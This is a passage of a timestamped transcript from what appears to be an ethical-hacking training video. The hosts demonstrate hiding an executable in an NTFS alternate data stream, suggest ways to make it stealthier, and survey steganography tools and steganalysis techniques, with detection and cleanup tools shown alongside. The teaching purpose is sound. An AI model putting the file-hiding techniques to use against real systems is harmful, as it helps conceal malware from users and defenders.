--> 00:47:50.360\nSo let's just come back here,\nlet's close that.\n\n971\n00:47:50.360 --> 00:47:54.780\nLet's just come back over to here, right?\n\n972\n00:47:54.780 --> 00:48:04.660\nLet's just do a just get that up on the\nscreen a little bit so it's easier to see.\n\n973\n00:48:04.660 --> 00:48:09.580\nWe just did a dir not too long ago was 45,\nright, for readme.txt, right?\n\n974\n00:48:09.580 --> 00:48:11.650\nSo let's just take a look.\n\n975\n00:48:11.650 --> 00:48:12.926\nShould be just slightly bigger now,\n\n976\n00:48:12.926 --> 00:48:15.075\nbecause I've added a little bit\nmore stuff in there, right?\n\n977\n00:48:15.075 --> 00:48:18.559\nSo readme.txt is 101 cuz I added\na couple lines of text, but\n\n978\n00:48:18.559 --> 00:48:23.324\nit's bigger because I added text, not\nbigger because We've modified everything.\n\n979\n00:48:23.324 --> 00:48:25.455\n>> [CROSSTALK] 33 Megs of Calc.\n\n980\n00:48:25.455 --> 00:48:28.926\n>> Absolutely, and then,\nif I go over here, and\n\n981\n00:48:28.926 --> 00:48:32.880\nI launch back door again,\nCalc is still there.\n\n982\n00:48:32.880 --> 00:48:34.980\nHasn't been modified, right?\n\n983\n00:48:34.980 --> 00:48:36.390\nIt's all still there.\n\n984\n00:48:36.390 --> 00:48:39.240\nSo, this is how we combine data 2,\n\n985\n00:48:39.240 --> 00:48:41.645\nan alternate data or through\nan alternate data stream bind data, and\n\n986\n00:48:41.645 --> 00:48:44.550\npotentionally of course, bind executables,\nthat's really the insidious part.\n\n987\n00:48:44.550 --> 00:48:47.030\nNow that's cool, I'm gonna show you\nsomething, at least what I think,\n\n988\n00:48:47.030 --> 00:48:48.900\nI think you thought it was kinda\ncool when I showed it to you too.\n\n989\n00:48:48.900 --> 00:48:51.340\nI'm gonna show you something\nthat's even cooler, right?\n\n990\n00:48:51.340 --> 00:48:55.000\nBecause when we do a list here we\ndon't see the alternate data stream,\n\n991\n00:48:55.000 --> 00:48:55.630\nit's not now.\n\n992\n00:48:57.170 --> 00:49:02.390\nTrue that if I do the dir right from here,\nI will see the symbolic link and\n\n993\n00:49:02.390 --> 00:49:06.350\nwill point out that there's something\nthere if I know what to look for, right?\n\n994\n00:49:06.350 --> 00:49:08.880\nSo I can see that, yeah,\nthere is something there.\n\n995\n00:49:08.880 --> 00:49:11.190\nAnd if I know what I'm looking at,\nthat does tell me that.\n\n996\n00:49:11.190 --> 00:49:13.880\n>> And you dont really need like if\nyou wanted to be even stealthier,\n\n997\n00:49:13.880 --> 00:49:16.050\nyou could maybe not\nmake this symbolically.\n\n998\n00:49:16.050 --> 00:49:18.410\nYou can still call that file\nwith the colon Calc in C.\n\n999\n00:49:18.410 --> 00:49:19.810\n>> I could, I just some make it easy.\n\n1000\n00:49:19.810 --> 00:49:22.120\nJust to purpose the demo to\nspring it right up, right.\n\n1001\n00:49:22.120 --> 00:49:24.700\nBut so I couldn't theory\nsee it by doing a DIR here.\n\n1002\n00:49:24.700 --> 00:49:27.660\nBut let's say we're smart, and\nwe stealth that, and we hide that, and\n\n1003\n00:49:27.660 --> 00:49:31.320\nwe don't leave that symbolically laying\naround for somebody to trip over, right?\n\n1004\n00:49:31.320 --> 00:49:36.100\nSo we could certainly hold, rather get\nrid of that, and still have this work.\n\n1005\n00:49:36.100 --> 00:49:41.330\nSo what if we want to find whether or\nnot there is a ABS.\n\n1006\n00:49:41.330 --> 00:49:46.120\nNow, starting with server 12 so\nprobably, let's say, Windows 8.1,\n\n1007\n00:49:46.120 --> 00:49:47.590\nI'm going to guess.\n\n1008\n00:49:47.590 --> 00:49:52.303\nI haven't tried it on Windows 8, but\nI'm thinking At least 8.1 certainly 12,\n\n1009\n00:49:52.303 --> 00:49:53.945\n12r2 and in Windows 10.\n\n1010\n00:49:53.945 --> 00:49:57.745\nThose of you that are Powershell\nofficianados we actually can\n\n1011\n00:49:57.745 --> 00:50:01.510\nget to this information\ndirectly through Powershell.\n\n1012\n00:50:01.510 --> 00:50:05.330\nWe've actually got a stream property\nthat we can use to look, or rather,\n\n1013\n00:50:05.330 --> 00:50:07.250\nstream attribute we can use I should say.\n\n1014\n00:50:07.250 --> 00:50:11.700\nSo we can see whether or not there are\nalternate data streams sitting on a file.\n\n1015\n00:50:11.700 --> 00:50:13.490\nSo I can go in in Powershell,\n\n1016\n00:50:13.490 --> 00:50:17.190\nyou'll see I'm in the Powershell ice\neditor here, I'm on the same machine.\n\n1017\n00:50:17.190 --> 00:50:21.010\nGet item Path, so\nget whatever item is in this path.\n\n1018\n00:50:21.010 --> 00:50:21.625\nWhat path?\n\n1019\n00:50:21.625 --> 00:50:23.350\nC:\\test, right?\n\n1020\n00:50:23.350 --> 00:50:24.130\nCall the file.\n\n1021\n00:50:24.130 --> 00:50:26.129\nJust notice I just listed a file,\nreadme.txt.\n\n1022\n00:50:26.129 --> 00:50:28.390\n>> Yeah.\n>> Not readme.txt:calc.exe or whatever,\n\n1023\n00:50:28.390 --> 00:50:29.200\njust-\n>> Cuz you don't\n\n1024\n00:50:29.200 --> 00:50:30.540\nknow if that's there at this point.\n\n1025\n00:50:30.540 --> 00:50:34.028\n>> And I don't, yeah, and even if I did,\nI would not have to do this if I did.\n\n1026\n00:50:34.028 --> 00:50:37.958\nSo, just readme.txt-stream*.\n\n1027\n00:50:37.958 --> 00:50:40.489\nShow me anything that has\na stream associated with it.\n\n1028\n00:50:40.489 --> 00:50:43.453\nSo when I run this, right.\n\n1029\n00:50:43.453 --> 00:50:45.840\nSo I'm just going to go ahead and\nexecute that.\n\n1030\n00:50:45.840 --> 00:50:49.910\nWhen I get down here, that's why I like\nIce because we have our editor for\n\n1031\n00:50:49.910 --> 00:50:52.200\nour script and\nthen actually our Powershell.\n\n1032\n00:50:52.200 --> 00:50:54.780\nExecution window down\nbelow to see the output.\n\n1033\n00:50:54.780 --> 00:50:57.320\nWhat I see is that it goes ahead and\nprofiles for me,\n\n1034\n00:50:57.320 --> 00:51:00.180\nI see on the left the stream\ncolumn on the right length.\n\n1035\n00:51:00.180 --> 00:51:03.840\nI see that there is a stream\nassociated with this.\n\n1036\n00:51:03.840 --> 00:51:07.520\nIt exposes count.exe and\ntells me yes, absolutely.\n\n1037\n00:51:07.520 --> 00:51:12.210\nThere is a stream on the file and\nthe file is 101 bytes but\n\n1038\n00:51:12.210 --> 00:51:17.240\nwhen we actually go and take a look,\nwe see that calc.exe is actually attached.\n\n1039\n00:51:17.240 --> 00:51:18.810\nAnd it's not supposed to be there.\n\n1040\n00:51:18.810 --> 00:51:19.490\n>> That's very cool.\n\n1041\n00:51:19.490 --> 00:51:23.100\n>> So,\nwe can use Powershell to find the stream.\n\n1042\n00:51:23.100 --> 00:51:26.230\nAnd now that's again, that's a new\nfeature that's only been added starting\n\n1043\n00:51:26.230 --> 00:51:28.618\nwith 12 and 12 R 2 and\nWindows 8.1 and Windows 10.\n\n1044\n00:51:28.618 --> 00:51:30.150\n>> And we can-\n>> That's not available\n\n1045\n00:51:30.150 --> 00:51:30.689\nin earlier versions.\n\n1046\n00:51:30.689 --> 00:51:31.460\n>> Right, okay.\n\n1047\n00:51:31.460 --> 00:51:33.000\n>> Or\nit wont be supporting earlier versions.\n\n1048\n00:51:33.000 --> 00:51:35.960\n>> And you can start getting creative\nwith that script and start writing some\n\n1049\n00:51:35.960 --> 00:51:38.756\nloops to loop through entire directories\nlooking for the scams as well.\n\n1050\n00:51:38.756 --> 00:51:42.840\n>> Absolutely, essentially, I'll add\nto be clear cuz that's a great point,\n\n1051\n00:51:42.840 --> 00:51:46.370\nright,\n>> Really all Microsoft is done,\n\n1052\n00:51:46.370 --> 00:51:51.425\nis exposed this functionality, so\nthat we can now use it from PowerShell.\n\n1053\n00:51:51.425 --> 00:51:56.230\nBut a lot of discovery tools\nthat are out there, lads,\n\n1054\n00:51:56.230 --> 00:52:02.040\nstreams from sysinternals and winternals,\nlads that's been around forever and a day.\n\n1055\n00:52:02.040 --> 00:52:04.770\nAny of these tools essentially\ndid something similar.\n\n1056\n00:52:04.770 --> 00:52:06.760\nThey went through and\nlook for that attribute.\n\n1057\n00:52:06.760 --> 00:52:10.700\nBut what they were doing was just pulling\nit without it being exposed to us here.\n\n1058\n00:52:10.700 --> 00:52:13.860\nThis is just now gonna let us integrate\nit into a script and we can essentially\n\n1059\n00:52:13.860 --> 00:52:17.120\nwrite on discovery software just\nby having that and running that.\n\n1060\n00:52:17.120 --> 00:52:19.720\n>> So\nthat would also be pretty cool to do.\n\n1061\n00:52:19.720 --> 00:52:21.960\nAnd there are, as I said other tools.\n\n1062\n00:52:21.960 --> 00:52:24.820\nYou could download this tool\ncalled streams right here.\n\n1063\n00:52:24.820 --> 00:52:29.928\nAnd so if you wanted to,\nyou'll go through and you'll execute that.\n\n1064\n00:52:33.001 --> 00:52:34.680\nActually, you know what I've just,\nI'm curious about something.\n\n1065\n00:52:34.680 --> 00:52:36.098\nHold on just half a second,\nI'm just curious about something.\n\n1066\n00:52:36.098 --> 00:52:39.725\nI wanna see if I can open\nthat up automatically.\n\n1067\n00:52:39.725 --> 00:52:41.053\n>> I think they've moved it,\n\n1068\n00:52:41.053 --> 00:52:44.630\nit's like a Shift+Right-Click\non the containing folder.\n\n1069\n00:52:44.630 --> 00:52:45.218\n>> Is that what it is?\n\n1070\n00:52:45.218 --> 00:52:47.626\n[CROSSTALK] Well we'll figure that out\nlater, I haven't played with that.\n\n1071\n00:52:47.626 --> 00:52:48.640\nI'm in test, no big deal.\n\n1072\n00:52:48.640 --> 00:52:51.960\nI was just curious if it was, cuz you\ncould just right-click and go boom.\n\n1073\n00:52:51.960 --> 00:52:52.898\n>> And launch it from right there.\n\n1074\n00:52:52.898 --> 00:52:53.695\n>> Launch it right there, right?\n\n1075\n00:52:53.695 --> 00:52:56.170\nSo I can load streams there, you'll see.\n\n1076\n00:52:56.170 --> 00:52:57.720\nIt's a very simple tool, right?\n\n1077\n00:52:57.720 --> 00:53:02.130\nYou would just have to do streams minus s\nto recurse through and see what's there.\n\n1078\n00:53:02.130 --> 00:53:04.530\nAnd I could find everything\nwith data streams in it.\n\n1079\n00:53:04.530 --> 00:53:06.640\n>> Nice.\n>> Yeah, launch that from the C drive or\n\n1080\n00:53:06.640 --> 00:53:08.330\nsomething and you look at everything.\n\n1081\n00:53:08.330 --> 00:53:10.300\nBut also I could delete\nstreams with that tool.\n\n1082\n00:53:10.300 --> 00:53:11.390\n>> Right.\n>> Streams minus d,\n\n1083\n00:53:11.390 --> 00:53:14.620\nand I can specify what stream is and\nI can get rid of it if I want.\n\n1084\n00:53:14.620 --> 00:53:17.020\nAnd as I said, lads and\nother tools are available.\n\n1085\n00:53:17.020 --> 00:53:18.900\n>> Right.\n>> I've been using lads for years.\n\n1086\n00:53:18.900 --> 00:53:22.215\nI like it because it has a cool\nlittle icon, it's a magnifying glass.\n\n1087\n00:53:22.215 --> 00:53:23.800\n>> uh-huh.\n>> Shows you such and such, and\n\n1088\n00:53:23.800 --> 00:53:24.560\nI think that's cool.\n\n1089\n00:53:24.560 --> 00:53:27.580\nBut that's me, I'm A child at\nheart I get distracted easily.\n\n1090\n00:53:27.580 --> 00:53:30.180\nAnyway so ntsf data streams right?\n\n1091\n00:53:30.180 --> 00:53:31.590\nShowing you how to set them up.\n\n1092\n00:53:31.590 --> 00:53:34.480\nMaking sure we're aware of\nwhat you can do with them.\n\n1093\n00:53:34.480 --> 00:53:37.925\nObviously the value of them\nis that we can hide data.\n\n1094\n00:53:37.925 --> 00:53:40.235\nSo it maybe good for us to,\nyou secret away certain things,\n\n1095\n00:53:40.235 --> 00:53:41.655\nwe just wanna know for ourselves.\n\n1096\n00:53:41.655 --> 00:53:44.885\nThe downside of course is a bad\nactor gets a hold of this thing,\n\n1097\n00:53:44.885 --> 00:53:46.185\nthrows malware in there.\n\n1098\n00:53:46.185 --> 00:53:48.665\nSomebody launches that file and\n\n1099\n00:53:48.665 --> 00:53:53.422\nboom, malware is in the system and\nall sorts of crazy stuff starts going on.\n\n1100\n00:53:53.422 --> 00:53:59.152\nSo we got to make sure we delete those\nfiles that are or have been streamed,\n\n1101\n00:53:59.152 --> 00:54:03.700\nvery important, discovery software,\nlike Streams, LADs, the PowerShell.\n\n1102\n00:54:03.700 --> 00:54:05.860\nIssue that I showed you would all work.\n\n1103\n00:54:05.860 --> 00:54:08.610\nYou could also by the way, people forget\nabout this and don't realize this.\n\n1104\n00:54:09.660 --> 00:54:12.690\nYou could take a file you think\nhas a stream attached to it and\n\n1105\n00:54:12.690 --> 00:54:16.320\nmove it to a FAT partition, and then all\nof a sudden boom look at that you've got\n\n1106\n00:54:16.320 --> 00:54:20.720\ntwice the number of files you had before,\nbecause now everything gets exposed.\n\n1107\n00:54:20.720 --> 00:54:25.200\nThat's also something to consider, because\nmoving it to a FAT partition or a non-NTFS\n\n1108\n00:54:25.200 --> 00:54:28.980\npartition, let's put it that way, will\nactually allow us to expose the strength.\n\n1109\n00:54:28.980 --> 00:54:31.840\nSo that may be something else to consider,\nwhich is kinda cool.\n\n1110\n00:54:31.840 --> 00:54:36.750\nAD Spy is another, or ADS Spy rather,\nis another tool out there that's\n\n1111\n00:54:36.750 --> 00:54:39.340\nprobably still around as far as\nI remember that you can use.\n\n1112\n00:54:39.340 --> 00:54:43.320\nI think Stream Armor has an NTFS stream\ndetector tool, which that is kinda cool.\n\n1113\n00:54:43.320 --> 00:54:45.110\nI've used their stuff before as well.\n\n1114\n00:54:45.110 --> 00:54:48.290\nThey have a lot of free stuff out there\nactually so that's kinda of cool.\n\n1115\n00:54:48.290 --> 00:54:50.520\nSo you may be able to play\nwith that a little bit.\n\n1116\n00:54:50.520 --> 00:54:52.870\nWe also want to throw steganography\nout there real quickly and\n\n1117\n00:54:52.870 --> 00:54:56.580\njust talk about the fact that we can\nhide files inside of other files.\n\n1118\n00:54:56.580 --> 00:54:57.870\nWe've talked about this.\n\n1119\n00:54:57.870 --> 00:55:02.190\nUse the white space potentially inside\nof a file to be able to hide something.\n\n1120\n00:55:02.190 --> 00:55:06.748\nSo we could take a file, we could open\nit up with a steganographic editor,\n\n1121\n00:55:06.748 --> 00:55:09.479\nput another file inside, close it back up.\n\n1122\n00:55:09.479 --> 00:55:13.096\nEssentially the editor maps the bits\nthat we spread around in the file,\n\n1123\n00:55:13.096 --> 00:55:15.210\nthe containing file as it's called.\n\n1124\n00:55:15.210 --> 00:55:17.380\nAnd we then can extract those bits and\n\n1125\n00:55:17.380 --> 00:55:19.860\nput them back together,\nagain it's like a big jigsaw puzzle.\n\n1126\n00:55:19.860 --> 00:55:24.160\nAnd so we can go in and do all sorts\nof different kinds of steganography.\n\n1127\n00:55:24.160 --> 00:55:26.697\nWith video, with audio streams,\nwith pictures,\n\n1128\n00:55:26.697 --> 00:55:30.355\njust about with anything use the white\nspace on the hard drive itself, and\n\n1129\n00:55:30.355 --> 00:55:32.930\nactually hide stuff within the hard drive.\n\n1130\n00:55:32.930 --> 00:55:38.390\nThere are just a million different\nways for us, to use this technology.\n\n1131\n00:55:38.390 --> 00:55:43.120\nSo, we can use as I said, Image\nSteganography, Document Steganography,\n\n1132\n00:55:43.120 --> 00:55:49.100\ndo it folders, do it in video and audio,\nwhite space as I mentioned, on the web\n\n1133\n00:55:51.250 --> 00:55:56.020\nthrough Web Directories, stuff on the web.\n\n1134\n00:55:56.020 --> 00:55:57.470\nI can't think of the word I want to use.\n\n1135\n00:55:57.470 --> 00:55:59.960\nJust all the stuff,\nit's like get the Active Directories and\n\n1136\n00:55:59.960 --> 00:56:00.880\nthe roots of the web server,\n\n1137\n00:56:00.880 --> 00:56:04.910\nwe could do it in there through email you\ncan actually do steganography in email.\n\n1138\n00:56:04.910 --> 00:56:06.885\nYou could do it on media like DVD.\n\n1139\n00:56:06.885 --> 00:56:08.710\nBlu-rays, all that kinda stuff.\n\n1140\n00:56:08.710 --> 00:56:10.860\nYou can load stuff in there and hide it.\n\n1141\n00:56:10.860 --> 00:56:15.216\nWe could do it in natural text by hiding\ndata inside the flow of the system,\n\n1142\n00:56:15.216 --> 00:56:17.833\nwithin the OS itself, within source code.\n\n1143\n00:56:17.833 --> 00:56:21.319\nThere's just all these different\nways to steganofy a file, so\n\n1144\n00:56:21.319 --> 00:56:24.277\nthat we could put stuff inside and\nwe could use tools,\n\n1145\n00:56:24.277 --> 00:56:28.390\na white space steganography tools\nlike SNOW, which are really popular.\n\n1146\n00:56:28.390 --> 00:56:33.261\nThis one's been around forever and a day,\nit lets you do basically ASCII editing,\n\n1147\n00:56:33.261 --> 00:56:35.490\nso you go in and edit the text.\n\n1148\n00:56:35.490 --> 00:56:40.070\nWe can go in and we can do things\nlike least significant bid insertion,\n\n1149\n00:56:40.070 --> 00:56:43.270\nessentially, we're able to modify\nthe least significant bid and\n\n1150\n00:56:43.270 --> 00:56:45.410\nyou swap it out and\nput stuff in there, right?\n\n1151\n00:56:45.410 --> 00:56:48.683\nSo that way we break up the message\nessentially scattering the bits around.\n\n1152\n00:56:48.683 --> 00:56:52.682\nWe refer to this as bit splitting when\nwe talk about it with cryptography, and\n\n1153\n00:56:52.682 --> 00:56:56.558\nin the cloud as removing bits around and\nstoring them in different places,\n\n1154\n00:56:56.558 --> 00:56:59.285\nbut we can also do least\nsignificant bit insertion.\n\n1155\n00:56:59.285 --> 00:57:03.069\nWe can do masking and filtering techniques\nto be able to mask the data that\n\n1156\n00:57:03.069 --> 00:57:07.290\nwe're putting into the image to prevent\nit from modifying the core image.\n\n1157\n00:57:07.290 --> 00:57:11.440\nSo, could we show the shot of\njust behind Mike the ITProTV logo\n\n1158\n00:57:11.440 --> 00:57:12.760\nthat's up for a second.\n\n1159\n00:57:12.760 --> 00:57:15.350\nYeah, there.\nSo, thank you, sir,\n\n1160\n00:57:15.350 --> 00:57:16.870\nI appreciate you moving out of the way.\n\n1161\n00:57:16.870 --> 00:57:19.320\nSo please, join us at the console.\n\n1162\n00:57:19.320 --> 00:57:21.860\n>> [LAUGH] Do the whole Vanna White thing,\nright?\n\n1163\n00:57:21.860 --> 00:57:22.810\n>> That's all you, buddy, not me.\n>> [LAUGH]\n\n1164\n00:57:22.810 --> 00:57:23.392\n>> All right, so\n\n1165\n00:57:23.392 --> 00:57:24.610\nI don't have the legs for it.\n\n1166\n00:57:24.610 --> 00:57:27.094\nSo, what you can see here and\nI talk about white space, literally,\n\n1167\n00:57:27.094 --> 00:57:27.929\nwhite space, right?\n\n1168\n00:57:27.929 --> 00:57:31.278\nBut you can see there's a whole bunch of\nwhite around the icon here in the image.\n\n1169\n00:57:31.278 --> 00:57:35.305\nBut inside the image, if you notice,\nthere's this I and the T that's white,\n\n1170\n00:57:35.305 --> 00:57:36.750\ninside the logo.\n\n1171\n00:57:36.750 --> 00:57:40.070\nOne of the things we could do here would\nliterally be to take this image file,\n\n1172\n00:57:40.070 --> 00:57:43.860\nwhich is nothing more than just a graphic,\na JPEG or PNG or whatever, right?\n\n1173\n00:57:43.860 --> 00:57:48.565\nAnd we could go in using a tool,\nwe could actually put plans for\n\n1174\n00:57:48.565 --> 00:57:51.455\nhow to create an ADS stream or\n\n1175\n00:57:51.455 --> 00:57:56.185\nwhatever, hide them by editing them\ninto the space inside this graphic.\n\n1176\n00:57:56.185 --> 00:58:00.005\nAnd if we use greyscaling to understand\nhow to modify the color scale,\n\n1177\n00:58:00.005 --> 00:58:02.515\nwe can make the colors look the same,\nit wouldn't change, but\n\n1178\n00:58:02.515 --> 00:58:07.250\nwe could back end this image with all\nsorts of data underneath and layer it.\n\n1179\n00:58:07.250 --> 00:58:09.630\nThis is a good one because you\nhave three different images here,\n\n1180\n00:58:09.630 --> 00:58:12.010\nplus the logo in the middle\nthat's making up.\n\n1181\n00:58:12.010 --> 00:58:15.960\nSo I could layer stuff into multiple blue,\norange, light blue all together.\n\n1182\n00:58:15.960 --> 00:58:17.620\nI could do a lot with that image, right?\n\n1183\n00:58:17.620 --> 00:58:18.310\n>> We did that just for you.\n\n1184\n00:58:18.310 --> 00:58:20.920\n>> I appreciate that,\nthat's gonna be pretty cool.\n\n1185\n00:58:20.920 --> 00:58:23.340\nRight so,\nwe could do all that kind of stuff.\n\n1186\n00:58:23.340 --> 00:58:25.720\nRemember with the sound waves,\nfor instance in the video,\n\n1187\n00:58:25.720 --> 00:58:29.440\nthe audio files, we can modify\nthe sound waves, hiding stuff in there.\n\n1188\n00:58:29.440 --> 00:58:32.060\nYou see that on some of those\nTV shows sometimes like CSI and\n\n1189\n00:58:32.060 --> 00:58:37.220\nthings like that where somebody has hidden\nlike a message inside the audio file.\n\n1190\n00:58:37.220 --> 00:58:40.500\nThey have to figure it out,\nthere's encrypted data or something.\n\n1191\n00:58:40.500 --> 00:58:45.320\nYou can do all sorts of crazy stuff where\nthe message doesn't normally sound like\n\n1192\n00:58:45.320 --> 00:58:48.190\nanything you would recognize, but\nthen if you play it back a certain way,\n\n1193\n00:58:48.190 --> 00:58:52.050\nyou have to speed it up or slow it down,\nuse a certain kind of filter\n\n1194\n00:58:52.050 --> 00:58:55.642\nto filter out certain noise, all of\na sudden you hear the hidden message.\n\n1195\n00:58:55.642 --> 00:59:00.690\nYeah, there’s been rumors about the fact\nthat, this kind of stuff is being used to\n\n1196\n00:59:00.690 --> 00:59:03.530\ncommunicate among the terror\ngroups that are out there.\n\n1197\n00:59:03.530 --> 00:59:06.820\nFor instance, they are sending encoded\nmessages so that people don't know what's\n\n1198\n00:59:06.820 --> 00:59:09.500\nin these files that you're\ndownloading from the dark web.\n\n1199\n00:59:09.500 --> 00:59:12.510\nAll these things that always\nfloat around about this and\n\n1200\n00:59:12.510 --> 00:59:14.060\na lot of it is probably true.\n\n1201\n00:59:14.060 --> 00:59:16.100\nRight, I mean, a lot of it does happen,\n\n1202\n00:59:16.100 --> 00:59:19.880\nbut we do want to know that there's all\nsorts of ways to manipulate files and\n\n1203\n00:59:19.880 --> 00:59:23.000\nsteganography is going to be\nthe ability to be able to do this.\n\n1204\n00:59:23.000 --> 00:59:27.300\nIt’s just all these different\ncategories of steganographic\n\n1205\n00:59:27.300 --> 00:59:29.110\ntools that we can use and\nas we talked about.\n\n1206\n00:59:29.110 --> 00:59:30.300\nAnd there are some pretty cool ones.\n\n1207\n00:59:30.300 --> 00:59:33.090\nDeep Sound, which is an audio one,\nInvisible Secrets,\n\n1208\n00:59:33.090 --> 00:59:37.230\nwhich can be used for\nfull steganography, Spam Mimics,\n\n1209\n00:59:37.230 --> 00:59:40.200\nwhich is an email one that\nlets us mess around with that.\n\n1210\n00:59:40.200 --> 00:59:42.420\nThere's even tools for\nthe mobile platform, for mobile phones,\n\n1211\n00:59:42.420 --> 00:59:43.850\nwe could do it there.\n\n1212\n00:59:43.850 --> 00:59:51.166\nStegosec and StegDroid Alpha,\nthere is Stegomatic, Secret Letter.\n\n1213\n00:59:51.166 --> 00:59:54.570\nThese are ones that will potentially\nwork on mobile platforms as well.\n\n1214\n00:59:54.570 --> 00:59:56.600\nAnd then there's Steganalysis,\nwhich is essentially,\n\n1215\n00:59:56.600 --> 00:59:59.100\nhey, what's in that image over there and\nhow did that work?\n\n1216\n00:59:59.100 --> 01:00:01.880\nOr, actually, I should do, I never get\nthis right, I should do, let me see.\n\n1217\n01:00:03.240 --> 01:00:04.545\nMeagan, guide me in, am I almost there?\n\n1218\n01:00:04.545 --> 01:00:05.654\n[SOUND] Wow, look at that.\n\n1219\n01:00:05.654 --> 01:00:06.943\n>> [LAUGH]\n>> Right there, right?\n\n1220\n01:00:06.943 --> 01:00:08.773\nIt would be great if it kinda\nmoved when I did that, right?\n\n1221\n01:00:08.773 --> 01:00:09.309\n>> [LAUGH] Yeah.\n\n1222\n01:00:09.309 --> 01:00:10.104\n>> Maybe made a little sound.\n\n1223\n01:00:10.104 --> 01:00:11.920\nThe Pillsbury,\ndon't you you have that thing recorded?\n\n1224\n01:00:11.920 --> 01:00:12.572\nPillsbury dough--\n>> [CROSSTALK]\n\n1225\n01:00:12.572 --> 01:00:13.203\n>> No, we don't want to show that again.\n\n1226\n01:00:13.203 --> 01:00:13.939\n>> Aw, come on, please?\n\n1227\n01:00:13.939 --> 01:00:14.634\n>> Whoo-hoo-hoo.\n\n1228\n01:00:14.634 --> 01:00:16.283\n>> That would be so cool.\nWe got to get that one.\n\n1229\n01:00:16.283 --> 01:00:16.820\n>> [SOUND]\n>> Right there, right\n\n1230\n01:00:16.820 --> 01:00:17.370\nthere, so-\n>> [LAUGH]\n\n1231\n01:00:17.370 --> 01:00:18.180\n>> You could do that.\n\n1232\n01:00:18.180 --> 01:00:21.272\nThat's what happens when Mike and I spend\ntime off-camera, we got nothing to do.\n\n1233\n01:00:21.272 --> 01:00:23.920\n>> [LAUGH]\n>> We're just, crazy stuff happens here.\n\n1234\n01:00:23.920 --> 01:00:28.240\nBut steganalysis, right, is the art,\nthe science of studying this and\n\n1235\n01:00:28.240 --> 01:00:31.350\ndiscovering and rendering covert\nmessages using steganography.\n\n1236\n01:00:31.350 --> 01:00:34.510\nWe're essentially trying to finding\nout what's been stegonified, and\n\n1237\n01:00:34.510 --> 01:00:39.130\nas a result, reverse the process and\nunderstand what's there so we can find it.\n\n1238\n01:00:39.130 --> 01:00:42.760\nOne of the challenges we have as\nCEH is as ethical hackers is, yeah,\n\n1239\n01:00:42.760 --> 01:00:45.270\nwe look at a file, we don't really\nnecessarily know, just like we look at\n\n1240\n01:00:45.270 --> 01:00:48.740\na file with alternate data streams we\nmay not know that something's been done.\n\n1241\n01:00:48.740 --> 01:00:53.120\nAnd there are tools we can use, but we\nhave to suspect that this has been done,\n\n1242\n01:00:53.120 --> 01:00:56.920\notherwise you'll spend your day running\nevery file in a system through these tools\n\n1243\n01:00:56.920 --> 01:00:58.130\nto figure it out.\n\n1244\n01:00:58.130 --> 01:01:01.983\nIt's just not a very effective way to do\nthis, and this is a significant challenge,\n\n1245\n01:01:01.983 --> 01:01:04.916\nand the bad actors know that\nbecause they know that chances are,\n\n1246\n01:01:04.916 --> 01:01:08.502\nwith a million files on a system, the\nlikelihood of you pulling the one that's\n\n1247\n01:01:08.502 --> 01:01:12.011\nbeen corrupted is very small unless you\nknow it's targeted and go after it.\n\n1248\n01:01:12.011 --> 01:01:13.615\nSo, it can be a big issue, right?\n\n1249\n01:01:13.615 --> 01:01:16.571\nAnd it's something that we have to think\nabout as well because you know there\n\n1250\n01:01:16.571 --> 01:01:17.690\nare ways that we can do this.\n\n1251\n01:01:17.690 --> 01:01:18.720\nWe can do, essentially or use,\n\n1252\n01:01:18.720 --> 01:01:23.350\nif you think about, are you up on your\nmethodologies for cryptography attached?\n\n1253\n01:01:23.350 --> 01:01:24.558\nRemember that whole conversation?\n\n1254\n01:01:24.558 --> 01:01:25.180\n>> Yes, I think so.\n\n1255\n01:01:25.180 --> 01:01:27.890\n>> Shows in plain text, no plain text.\n\n1256\n01:01:27.890 --> 01:01:31.590\nSo, essentially, those kind of attacks,\nand we'll talk about those in upcoming\n\n1257\n01:01:31.590 --> 01:01:34.950\nepisodes with cryptography, are gonna be\nthe same kind of attacks we use here,\n\n1258\n01:01:34.950 --> 01:01:37.460\nbut we focus them on\nthe stego information.\n\n1259\n01:01:37.460 --> 01:01:41.141\nSo we could do a stego only attack where\nwe only have the stegonified object or\n\n1260\n01:01:41.141 --> 01:01:42.933\nimage and we have to work backwards.\n\n1261\n01:01:42.933 --> 01:01:46.628\nWe can use what's called the known\ncover attack where the attacker,\n\n1262\n01:01:46.628 --> 01:01:50.959\nas they attack us, in other words,\nthe security professional looking at this,\n\n1263\n01:01:50.959 --> 01:01:54.972\nwill compare the stego object and\nthe cover medium to identify the deltas,\n\n1264\n01:01:54.972 --> 01:01:59.113\nthe differences, much like the file\ncomparison we talked about to do the root\n\n1265\n01:01:59.113 --> 01:02:00.993\nkit reveal with WinDiff, right?\n\n1266\n01:02:00.993 --> 01:02:04.618\nWhere we have the bad and then we\nhave the known good and we look for\n\n1267\n01:02:04.618 --> 01:02:06.713\nthose, it's called a known cover.\n\n1268\n01:02:06.713 --> 01:02:11.340\nKnown stego, we know the stego algorithm\nand the cover medium and the stego object.\n\n1269\n01:02:11.340 --> 01:02:14.590\nWe're gonna have access to those, we're\ngonna try to figure out what's been done.\n\n1270\n01:02:14.590 --> 01:02:15.940\nIt's basically an encryption problem,\nright?\n\n1271\n01:02:15.940 --> 01:02:18.410\nIt's just an encryption\nproblem of a different type.\n\n1272\n01:02:18.410 --> 01:02:22.610\nWe have chosen message,\nwe have known message and chosen stegos.\n\n1273\n01:02:22.610 --> 01:02:26.110\nSo, there are six different methodologies\nthat could be used potentially\n\n1274\n01:02:26.110 --> 01:02:29.670\nto go after this kind of stuff and figure\nout how to crack it, will be good for\n\n1275\n01:02:29.670 --> 01:02:32.190\nyou to have a sense of those and\nknow what they are, and\n\n1276\n01:02:32.190 --> 01:02:36.390\nobviously be comfortable with the idea\nthat we can use these attack mechanisms.\n\n1277\n01:02:36.390 --> 01:02:40.840\nWhen we say attack, remember, us,\nas the security professional are gonna go,\n\n1278\n01:02:40.840 --> 01:02:43.015\nsomething just flew into\nmy eye as we're talking.\n\n1279\n01:02:43.015 --> 01:02:43.960\n>> [LAUGH]\n>> And I'm blinking and\n\n1280\n01:02:43.960 --> 01:02:45.180\nit's not going away.\n\n1281\n01:02:45.180 --> 01:02:46.215\nBroken windshield wipers.\n\n1282\n01:02:46.215 --> 01:02:47.150\n>> [LAUGH]\n>> And so,\n\n1283\n01:02:47.150 --> 01:02:49.440\nwe want to make sure that we think\nabout the fact that when I say,\n\n1284\n01:02:49.440 --> 01:02:51.480\nattacker, it's really us, right?\n\n1285\n01:02:51.480 --> 01:02:53.156\nThe CEH, the ethical hacker.\n\n1286\n01:02:53.156 --> 